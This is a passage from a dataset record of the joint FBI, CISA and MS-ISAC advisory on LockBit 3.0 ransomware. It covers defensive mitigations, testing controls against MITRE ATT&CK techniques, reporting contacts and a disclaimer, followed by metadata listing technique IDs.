8.3] received from outside your organization.\nDisable hyperlinks in received emails.\nImplement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.\nDisable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.\nMaintain offline backups of data, and regularly maintain backup and restoration [CPG 7.3]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.\nEnsure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization\u2019s data infrastructure [CPG 3.3].\n\nVALIDATE SECURITY CONTROLS\nIn addition to applying mitigations, the FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and the MS-ISAC authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.To get started:\n\nSelect an ATT&CK technique described in this advisory (see Table 3).\nAlign your security technologies against the technique.\nTest your technologies against the technique.\nAnalyze your detection and prevention technologies performance.\nRepeat the process for all security technologies to obtain a set of comprehensive performance data.\nTune your security program, including people, processes, and technologies, based on the data generated by this process.\n\nThe FBI, CISA, and the MS-ISAC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.\nRESOURCES\n\nStopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.\nResource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.\nNo-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.\n\nREPORTING\nThe FBI is seeking any information that can be legally shared, including:\n\nBoundary logs showing communication to and from foreign IP addresses\nSample ransom note\nCommunications with LockBit 3.0 actors\nBitcoin wallet information\nDecryptor files\nBenign sample of an encrypted file\n\nThe FBI, CISA, and MS-ISAC do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office or CISA at report@cisa.gov. State, local, tribal, and territorial (SLTT) government entities can also report to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).\nDISCLAIMER\nThe information in this report is being provided \u201cas is\u201d for informational purposes only. The FBI, CISA, and the MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS-ISAC.\nYour feedback is important. Please take a few minutes to share your opinions on this product through an anonymous Product Feedback Survey.\n",
  "cves": [],
  "techniques": [
    "T1614.001",
    "T1070.004",
    "T1491.001",
    "T1021.001",
    "T1003.001",
    "T1480.001",
    "T1071.002",
    "T1567.002"
  ],
  "advisory": "aa23-075a",
  "title": "#StopRansomware: LockBit 3.0 | CISA",
  "source": "cybersecurity-advisories",
  "id": "d5c9cdf16d5687e7598e48b093a3a68f48b390c6a655cdc845fbc8c8bb6aa6f0"
}